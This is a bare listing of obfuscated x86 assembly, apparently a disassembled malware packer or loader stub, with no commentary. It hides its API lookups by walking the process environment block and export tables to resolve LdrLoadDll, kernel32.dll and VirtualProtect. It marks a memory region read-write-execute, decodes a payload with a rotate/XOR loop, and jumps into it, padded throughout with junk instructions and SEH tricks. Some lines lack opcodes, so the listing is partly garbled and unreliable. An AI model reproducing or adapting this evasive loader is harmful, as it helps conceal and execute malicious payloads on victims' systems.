_start
pushad
sub esp 0x4
mov [ esp ] eax
xor eax [ esp ]
and esi esi
adc esp 0x4
push esp
or ecx ecx
sbb eax 0xffffffff
pop esi
or edx edx
adc eax 0x1
sub esi 0x4
inc eax
neg eax
call $+5
sub [ esi ] eax
retn
sub_55402035
xor edx edx
mov eax 0x0
xor eax edx
dec al
dec ax
mov ah al
push edx
pop ecx
call $+5
add [ esp ] edx
jmp [ esp ]
sub edx edx
add edx ecx
and esi 0x0
or esi [ esp ]
sub ecx 0xffffffff
movzx ebx [ esi + ecx - 0x2 ]
sub esp 0x4
mov [ esp ] eax
or edx edx
sbb eax ebx
pop eax
jne r-xdata
out 0x0 al
sub_554020ad
push [ fs : 0x0 ]
or edx edx
adc edx esi
xor ebx ebx
or ebx 0xffff
not ecx
test edi edi
adc edx esi
mov [ fs : 0x0 ] esp
and edx ecx
test edi edi
adc edx esi
test esi esi
jae r-xdata
call $+5
call sub_554020ad
call $+5
mov [ esp ] ecx
mov ecx 0x0
add ecx [ esp + 0x10 ]
or edx edx
sbb [ ecx + 0xb8 ] 0xffffffff
add [ ecx + 0xb8 ] 0x1
pop ecx
xor eax eax
retn 0x10
pop eax
test edx edx
mov eax 0x0
adc eax [ esp ]
mov [ fs : 0x0 ] eax
add esp 0x8
mov esi 0x0
or esi edx
and eax 0x0
or eax [ edx + 0x3c ]
add edx eax
and eax 0x0
or eax 0x4550
and edi 0x0
add edi [ edx ]
sub esp 0x4
mov [ esp ] eax
xor eax edi
pop eax
jne r-xdata
jmp [ esp ]
popad
xor eax eax
or eax 0x1
retn 0xc
xor eax eax
xor eax [ edx + 0x78 ]
test eax eax
mov edx 0x0
adc edx eax
test esi esi
adc edx esi
sub esp 0x4
mov [ esp ] edx
and eax 0x0
or eax [ edx + 0x20 ]
mov edx 0x0
or edx eax
add edx esi
push esi
add esp 0xfffffffc
mov [ esp ] edx
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
xor edx edx
xor eax eax
add eax esi
sub ecx ecx
add ecx [ esi ]
push ecx
pop esi
call $+5
and eax eax
mov ebp 0x0
adc ebp esp
test ebx ebx
adc esi ebx
sub esp 0x4
mov [ esp ] 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
call $+5
mov [ esp ] 0x4c72644c
push esp
pop edi
xor ecx ecx
xor ecx 0xb
[ esi ] [ edi ]
je r-xdata
sub edx esi
xor eax eax
mov eax [ edx ]
mov edi 0x0
or edi 0x5a4d
and eax ebx
push eax
xor eax edi
pop eax
je r-xdata
push ebp
pop esp
pop esi
sub esp 0x4
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] edx
pop ecx
mov esi [ esp ]
add esp 0x4
add esp 0x4
mov edx [ esp - 0x4 ]
xor ebx ebx
xor ebx edx
and ecx ecx
mov eax 0x0
adc eax [ edx + 0x24 ]
and edx 0x0
or edx eax
add edx esi
xor eax eax
or eax [ edx + ecx * 2 ]
and eax 0xffff
mov ecx 0x0
xor ecx eax
and eax 0x0
or eax [ ebx + 0x10 ]
sub ecx eax
test edx edx
adc ecx 0x1
xor edx edx
xor edx [ ebx + 0x1c ]
and ebx ebx
adc edx esi
mov eax 0x0
or eax [ edx + ecx * 4 ]
or ebx ebx
adc esi eax
and ebp 0x0
add ebp esp
call $+5
mov [ esp ] eax
xor eax [ esp ]
sub esp 0xfffffffc
sub esp 0x4
mov [ esp ] eax
xor edx edx
add edx esp
push eax
call $+5
mov [ esp ] 0x6c006c
push 0x64002e
add esp 0xfffffffc
mov [ esp ] 0x320033
push 0x6c0065
sub esp 0x4
mov [ esp ] 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
call $+5
mov [ esp ] 0x1a0018
xor edi edi
or edi esp
add esp 0xfffffffc
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] eax
push eax
add esp 0xfffffffc
mov [ esp ] esi
push edx
mov esi [ esp ]
add esp 0x4
add esp 0x4
mov ebx [ esp - 0x4 ]
call ebx
and eax 0x0
or eax [ esi ]
add esp 0xfffffffc
mov [ esp ] eax
mov eax [ esp ]
add esp 0x4
and ecx ecx
mov edi 0x0
adc edi [ fs : 0x30 ]
test edi edi
mov esi 0x0
adc esi [ edi + 0x10 ]
mov [ esi + 0x18 ] eax
mov esp ebp
and edi 0x0
or edi [ fs : 0x30 ]
xor esi esi
add esi [ edi + 0x10 ]
mov edx 0x0
sub edx [ esi + 0x18 ]
neg edx
mov esi edx
mov eax [ edx + 0x3c ]
and esi esi
adc edx eax
or ebx ebx
mov eax 0x0
adc eax [ edx + 0x78 ]
xor edx edx
xor edx eax
add edx esi
add esp 0xfffffffc
mov [ esp ] edx
xor eax eax
add eax [ edx + 0x20 ]
and ecx ecx
mov edx 0x0
adc edx eax
add edx esi
push esi
add esp 0xfffffffc
mov [ esp ] edx
mov esi [ esp ]
add esp 0x4
pop ebx
call $+5
mov [ esp ] edx
xor edx [ esp ]
sub esp 0xfffffffc
and eax 0x0
add eax esi
and ecx ecx
mov ecx 0x0
adc ecx [ esi ]
xor esi esi
xor esi ecx
call $+5
and ebp 0x0
or ebp esp
and edi edi
adc esi ebx
add esp 0xfffffffc
mov [ esp ] 0x7463
add esp 0xfffffffc
mov [ esp ] 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
push 0x74726956
mov edi 0x0
xor edi esp
and ecx 0x0
add ecx 0xf
[ esi ] [ edi ]
je r-xdata
or eax eax
adc edx 0x1
and edx edx
adc eax 0x4
mov esi 0x0
xor esi [ eax ]
xor esp esp
add esp ebp
jmp [ esp ]
or ebx ebx
mov esp 0x0
adc esp ebp
pop esi
add esp 0xfffffffc
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
mov ecx [ esp ]
add esp 0x4
add esp 0x4
mov esi [ esp - 0x4 ]
pop edx
mov ebx 0x0
add ebx edx
and eax 0x0
or eax [ edx + 0x24 ]
mov edx 0x0
or edx eax
test eax eax
adc edx esi
xor eax eax
or eax [ edx + ecx * 2 ]
and eax 0xffff
and ecx 0x0
add ecx eax
xor eax eax
or eax [ ebx + 0x10 ]
test ecx ecx
sbb ecx eax
and edi edi
adc ecx 0x1
mov edx 0x0
sub edx [ ebx + 0x1c ]
neg edx
add edx esi
xor eax eax
or eax [ edx + ecx * 4 ]
and eax eax
adc esi eax
mov ebx 0x0
add ebx 0x1000
call $+5
pop edx
and edx 0xfffff000
test edx edx
adc edx ebx
or ebx ebx
adc edx ebx
add esp 0xfffffffc
mov [ esp ] edx
mov edi 0x4
call $+5
add edx ebx
xor eax eax
xor eax [ edx ]
add edi 0xffffffff
je r-xdata
test ebx ebx
adc edx 0x1
or edi edi
adc eax 0x4
sub esi esi
add esi [ eax ]
mov esp 0x0
add esp ebp
jmp [ esp ]
mov eax [ esp ]
add esp 0x4
pop edx
call $+5
mov [ esp ] eax
push esp
call $+5
mov [ esp ] 0x40
push 0x45de
add esp 0xfffffffc
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] esi
add esp 0xfffffffc
mov [ esp ] edx
add esp 0x4
mov esi [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
call $+5
pop eax
test edi edi
adc eax 0x20
add esp 0xfffffffc
mov [ esp ] eax
call $+5
mov [ esp ] ebp
and ebp 0x0
or ebp esp
test eax eax
adc ebx 0x5
jmp ebx
jmp [ esp ]
sub_554024fd
add esp 0x4
mov ebx [ esp - 0x4 ]
push esi
pop edi
mov eax 0x0
xor eax 0xc
test edi edi
adc edi eax
xor esi esi
xor esi edi
mov ebp 0x0
sub ebp edi
neg ebp
xor ecx ecx
or ecx 0x453c
mov edx ecx
call $+5
or eax eax
sbb esi 0xffffffff
mov ecx [ esp ]
add esp 0x4
add ecx 0xffffffff
je r-xdata
stosb [ edi ]
pop eax
call ebp
add eax ebx
or ebx ebx
adc ecx edx
popad
xor eax eax
or eax 0x1
retn 0xc
jmp [ esp ]
xor eax eax
add eax [ esi ]
rol al cl
add esp 0xfffffffc
mov [ esp ] edx
xor eax [ esp ]
add esp 0x4
push ecx
xor ecx ecx
add ecx 0x40
call $+5
mov [ esp ] ebx
or ebx ebx
sbb ebx ecx
pop ebx
je r-xdata
